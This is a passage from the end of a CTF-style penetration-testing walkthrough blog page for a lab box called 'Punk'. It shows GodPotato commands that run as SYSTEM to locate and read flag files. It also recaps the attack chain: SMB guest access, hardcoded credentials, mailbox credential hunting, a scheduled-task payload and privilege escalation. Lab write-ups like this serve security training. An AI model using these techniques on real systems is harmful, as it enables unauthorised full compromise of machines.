+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\GodPotato-NET4.exe -cmd &quot;cmd /c dir C:\Users\ /s /b | findstr /i \&quot;user.flg user.txt user.flag flag.txt\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>The user flag turns out to be in the Public profile:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\GodPotato-NET4.exe -cmd &quot;cmd /c type C:\Users\Public\user.flg&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Both flags captured.</p>
+<hr>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Punk was a fun standalone box that rewarded thorough enumeration and following the breadcrumbs in order:</p>
+<ol>
+<li><strong>SMB guest access</strong> — a readable <code>dev</code> share exposed the reverse-engineering artifacts</li>
+<li><strong>.NET reversing</strong> — hardcoded credentials pulled straight out of the Mono assembly with <code>monodis</code></li>
+<li><strong>Credential hunting</strong> — an FTP log and a MailEnable mailbox handed us the SMTP creds and a default password</li>
+<li><strong>Prod-share abuse</strong> — a scheduled task auto-executing <code>cyber2077.exe</code> gave us code execution as <code>svc_v</code></li>
+<li><strong>SeImpersonatePrivilege</strong> — GodPotato took us from service account to <code>NT AUTHORITY\SYSTEM</code></li>
+</ol>
+<p>The lesson here is the usual one: default passwords (<code>&lt;REDACTED&gt;</code>) and hardcoded credentials in shipped binaries are a gift to an attacker, and a service account with impersonation rights turns any foothold into a full compromise. There’s also an SNMP target (<code>10.10.87.22</code>) that the binary pointed at — a nice thread to pull on for pivoting deeper into the lab.</p>
+<h2 id="Tools-Used"><a href="#Tools-Used" class="headerlink" title="Tools Used"></a>Tools Used</h2><ul>
+<li>Nmap</li>
+<li>NetExec</li>
+<li>smbclient</li>
+<li>monodis (mono-utils)</li>
+<li>ncat</li>
+<li>msfvenom</li>
+<li>Netcat</li>
+<li>GodPotato</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Punk-Complete-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Punk - Complete Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">1.3.</span> <span class="toc-text">SMB Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Guest-Access-Discovery"><span class="toc-number">1.3.1.</span> <span class="toc-text">Guest Access Discovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Engineering-the-NET-Assembly"><span class="toc-number">1.4.</span> <span class="toc-text">Reverse Engineering the .NET Assembly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Hunting"><span class="toc-number">1.5.</span> <span class="toc-text">Credential Hunting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Log"><span class="toc-number">1.5.1.</span> <span class="toc-text">FTP Log</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RID-Brute-Force"><span class="toc-number">1.5.2.</span> <span class="toc-text">RID Brute Force</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reading-the-Mailbox"><span class="toc-number">1.6.</span> <span class="toc-text">Reading the Mailbox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POP3-Login"><span class="toc-number">1.6.1.</span> <span class="toc-text">POP3 Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Decoding-the-Messages"><span class="toc-number">1.6.2.</span> <span class="toc-text">Decoding the Messages</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-Prod-Share-Code-Execution"><span class="toc-number">1.7.</span> <span class="toc-text">Initial Access - Prod Share Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Spraying-the-Default-Password"><span class="toc-number">1.7.1.</span> <span class="toc-text">Spraying the Default Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Building-the-Payload"><span class="toc-number">1.7.2.</span> <span class="toc-text">Building the Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-SYSTEM"><span class="toc-number">1.8.</span> <span class="toc-text">Privilege Escalation to SYSTEM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checking-Privileges"><span class="toc-number">1.8.1.</span> <span class="toc-text">Checking Privileges</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GodPotato"><span class="toc-number">1.8.2.</span> <span class="toc-text">GodPotato</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Grabbing-the-Flags"><span class="toc-number">1.9.</span> <span class="toc-text">Grabbing the Flags</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.10.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools-Used"><span class="toc-number">1.11.</span> <span class="toc-text">Tools Used</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&text=Ronin66-Punk"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&title=Ronin66-Punk"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&is_video=false&description=Ronin66-Punk"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ronin66-Punk&body=Check out this article: https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&title=Ronin66-Punk"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&title=Ronin66-Punk"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&title=Ronin66-Punk"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&title=Ronin66-Punk"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&name=Ronin66-Punk&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&t=Ronin66-Punk"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="panosoikogr" data-description="Support me on Buy me a coffee!" data-message="Thanks for stopping by! If you’d like to support my work, feel free to treat me to a coffee." data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+</body>
+</html>
